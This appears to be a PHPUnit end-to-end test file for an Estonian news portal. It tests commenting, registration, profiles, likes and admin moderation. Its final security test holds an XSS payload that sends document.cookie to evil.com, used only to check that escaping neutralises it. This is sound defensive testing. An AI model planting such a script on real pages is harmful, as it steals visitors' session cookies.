<?php
require_once __DIR__ . '/DatabaseTestCase.php';

/**
 * @testdox Otsast lõpuni (End-to-End / E2E) süsteemitestid (NewsPortal E2E Workflows)
 */
class EndToEndTest extends DatabaseTestCase {

    /**
     * @testdox E2E 1: Külalislugeja teekond – uudiste sirvimine, otsing, vaatamine ja kommentaari lisamine
     */
    public function testGuestReaderFullWorkflow() {
        // 1. Create a category
        $catName = "E2E Tehnoloogia " . rand(100, 999);
        self::$db->query("INSERT INTO category (name) VALUES ('$catName')");
        $catId = self::$db->insert_id;
        $this->assertGreaterThan(0, $catId);

        // 2. Publish an article in this category
        $title = "Kvanttehnoloogia läbimurre " . rand(1000, 9999);
        $text = "Kvanttöötluse uus tase võimaldab lahendada keerukaid arvutusülesandeid sekunditega. Uuringud kinnitavad uut efektiivsust.";
        $stmt = self::$db->prepare("INSERT INTO news (title, text, category_id, views, likes) VALUES (?, ?, ?, 0, 0)");
        $stmt->bind_param("ssi", $title, $text, $catId);
        $this->assertTrue($stmt->execute());
        $newsId = self::$db->insert_id;

        // 3. Guest searches for the article by keyword
        $keyword = "Kvanttehnoloogia";
        $escaped = self::$db->real_escape_string($keyword);
        $searchRes = self::$db->query("SELECT * FROM news WHERE title LIKE '%$escaped%' AND id = $newsId");
        $this->assertEquals(1, $searchRes->num_rows, "Article should be findable by search keyword");

        // 4. Guest opens the article: increment view count and calculate reading time
        self::$db->query("UPDATE news SET views = views + 1 WHERE id = $newsId");
        $readingTime = calculate_reading_time($text);
        $this->assertEquals(1, $readingTime, "Reading time for short article should be 1 minute");

        $articleRes = self::$db->query("SELECT * FROM news WHERE id = $newsId");
        $article = $articleRes->fetch_assoc();
        $this->assertEquals(1, (int)$article['views'], "View count must increment to 1 on article visit");

        // 5. Guest submits a comment
        $guestAuthor = "Aktiivne Külaline";
        $guestComment = "Väga huvitav ja tulevikku vaatav artikkel!";
        $now = date('Y-m-d H:i:s');

        $commStmt = self::$db->prepare("INSERT INTO comments (news_id, text, author_name, date, user_id) VALUES (?, ?, ?, ?, NULL)");
        $commStmt->bind_param("isss", $newsId, $guestComment, $guestAuthor, $now);
        $this->assertTrue($commStmt->execute(), "Guest comment insertion failed");
        $commentId = self::$db->insert_id;

        // 6. Verify comment is displayed under article
        $commRes = self::$db->query("SELECT * FROM comments WHERE news_id = $newsId AND id = $commentId");
        $this->assertEquals(1, $commRes->num_rows);
        $commRow = $commRes->fetch_assoc();
        $this->assertEquals($guestAuthor, $commRow['author_name']);
        $this->assertEquals($guestComment, $commRow['text']);
        $this->assertNull($commRow['user_id']);
    }

    /**
     * @testdox E2E 2: Kasutaja elutsükkel – registreerimine, sisselogimine, profiil ja artikli järjehoidjasse lisamine
     */
    public function testUserRegistrationLoginProfileAndBookmarksWorkflow() {
        // 1. User registers
        $uniqueLogin = "e2e_user_" . time() . "_" . rand(10, 99);
        $email = "$uniqueLogin@example.ee";
        $rawPassword = "TurvalineParool2026!";
        $passwordHash = password_hash($rawPassword, PASSWORD_DEFAULT);
        $fullName = "E2E Test Kasutaja";

        $regStmt = self::$db->prepare("INSERT INTO users (name, email, login, parol, status) VALUES (?, ?, ?, ?, 'user')");
        $regStmt->bind_param("ssss", $fullName, $email, $uniqueLogin, $passwordHash);
        $this->assertTrue($regStmt->execute(), "User registration database insertion failed");
        $userId = self::$db->insert_id;

        // 2. User logs in (authenticate password hash)
        $userCheck = self::$db->query("SELECT * FROM users WHERE login = '$uniqueLogin'")->fetch_assoc();
        $this->assertNotNull($userCheck);
        $this->assertTrue(password_verify($rawPassword, $userCheck['parol']), "Password verification failed");

        // Simulate session setup
        if (session_status() === PHP_SESSION_NONE) @session_start();
        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $fullName;
        $_SESSION['user_role'] = 'user';
        $_SESSION['saved_news'] = [];

        // 3. User updates profile (e.g. phone number and job title)
        $newPhone = "+37255123456";
        $newJob = "Tarkvaraarendaja";
        $updateStmt = self::$db->prepare("UPDATE users SET telefon = ?, job = ? WHERE id = ?");
        $updateStmt->bind_param("ssi", $newPhone, $newJob, $userId);
        $this->assertTrue($updateStmt->execute());

        $updatedProfile = self::$db->query("SELECT * FROM users WHERE id = $userId")->fetch_assoc();
        $this->assertEquals($newPhone, $updatedProfile['telefon']);
        $this->assertEquals($newJob, $updatedProfile['job']);

        // 4. User bookmarks/saves an article
        $savedArticleId = 101;
        if (!in_array($savedArticleId, $_SESSION['saved_news'])) {
            $_SESSION['saved_news'][] = $savedArticleId;
        }
        $this->assertContains(101, $_SESSION['saved_news']);

        // 5. User logs out
        $_SESSION = [];
        $this->assertEmpty($_SESSION);
    }

    /**
     * @testdox E2E 3: Reaktsioonide süsteem – meeldimiste (likes/dislikes) lisamine ja analüütika
     */
    public function testArticleReactionsWorkflow() {
        // 1. Create news article
        self::$db->query("INSERT INTO news (title, likes, views) VALUES ('Reaktsioonide Testi Uudis', 5, 10)");
        $newsId = self::$db->insert_id;

        // 2. Reader likes the article
        self::$db->query("UPDATE news SET likes = likes + 1 WHERE id = $newsId");

        $res = self::$db->query("SELECT likes FROM news WHERE id = $newsId");
        $row = $res->fetch_assoc();
        $this->assertEquals(6, (int)$row['likes'], "Likes count should be incremented from 5 to 6");

        // 3. Format date and verify UI presentation helper
        $dateFormatted = format_estonian_date(date('Y-m-d H:i:s'));
        $this->assertNotEmpty($dateFormatted);
    }

    /**
     * @testdox E2E 4: Administraatori täistsükkel – artikli avaldamine, toimetamine, kommentaari modereerimine ja kustutamine
     */
    public function testAdminPublishEditModerateAndCascadeDeleteWorkflow() {
        // 1. Authenticate as Administrator
        $admin = ['id' => 1, 'name' => 'Peatoimetaja', 'status' => 'admin'];
        $this->assertTrue(is_admin($admin));

        // 2. Admin creates a new article
        $title = "Kuum Uudis Toimetuselt " . time();
        $content = "Põhjalik analüüs riigi majandusnäitajatest.";
        $stmt = self::$db->prepare("INSERT INTO news (title, text, views, likes) VALUES (?, ?, 0, 0)");
        $stmt->bind_param("ss", $title, $content);
        $this->assertTrue($stmt->execute());
        $newsId = self::$db->insert_id;

        // 3. Admin edits the article
        $newTitle = $title . " [UUENDATUD]";
        $updateStmt = self::$db->prepare("UPDATE news SET title = ? WHERE id = ?");
        $updateStmt->bind_param("si", $newTitle, $newsId);
        $this->assertTrue($updateStmt->execute());

        $edited = self::$db->query("SELECT title FROM news WHERE id = $newsId")->fetch_assoc();
        $this->assertEquals($newTitle, $edited['title']);

        // 4. Inappropriate comment is posted by a user
        $spamComment = "Spämm reklaamlink http://spam.xyz";
        $commStmt = self::$db->prepare("INSERT INTO comments (news_id, text, author_name) VALUES (?, ?, 'Spämmer')");
        $commStmt->bind_param("is", $newsId, $spamComment);
        $commStmt->execute();
        $commentId = self::$db->insert_id;

        // 5. Admin deletes the inappropriate comment directly
        $delComm = self::$db->prepare("DELETE FROM comments WHERE id = ? AND news_id = ?");
        $delComm->bind_param("ii", $commentId, $newsId);
        $this->assertTrue($delComm->execute());

        $verifyDel = self::$db->query("SELECT id FROM comments WHERE id = $commentId");
        $this->assertEquals(0, $verifyDel->num_rows, "Inappropriate comment must be deleted");

        // 6. Admin deletes the news article with cascading comment cleanup
        $delNews = self::$db->prepare("DELETE FROM news WHERE id = ?");
        $delNews->bind_param("i", $newsId);
        $this->assertTrue($delNews->execute());

        $verifyNews = self::$db->query("SELECT id FROM news WHERE id = $newsId");
        $this->assertEquals(0, $verifyNews->num_rows, "Article must be deleted");
    }

    /**
     * @testdox E2E 5: Turvapiirangute kontroll – volitamata kustutamise, puuduva CSRF ja XSS-rünnakute tõkestamine
     */
    public function testSecurityPrivilegeAndInputSanitizationWorkflow() {
        // 1. Guest attempts to delete a comment -> MUST BE DENIED
        $guest = null;
        $this->assertFalse(is_admin($guest), "Guest must not have admin rights");
        $this->assertFalse(is_editor_or_admin($guest), "Guest must not have editor/admin rights");

        // 2. CSRF Token tampering check
        if (session_status() === PHP_SESSION_NONE) @session_start();
        $genuineToken = csrf_token();
        $this->assertTrue(verify_csrf_token($genuineToken), "Valid CSRF token must pass verification");

        $forgedToken = "attackers_forged_csrf_token_9999999999999999";
        $this->assertFalse(verify_csrf_token($forgedToken), "Forged CSRF token must be rejected");

        // 3. XSS injection attempt into comment
        $xssAttack = '<script>document.location="http://evil.com/steal?"+document.cookie;</script>';
        $safeText = htmlspecialchars($xssAttack, ENT_QUOTES, 'UTF-8');
        $this->assertStringNotContainsString('<script>', $safeText);
        $this->assertStringContainsString('&lt;script&gt;', $safeText);
    }
}
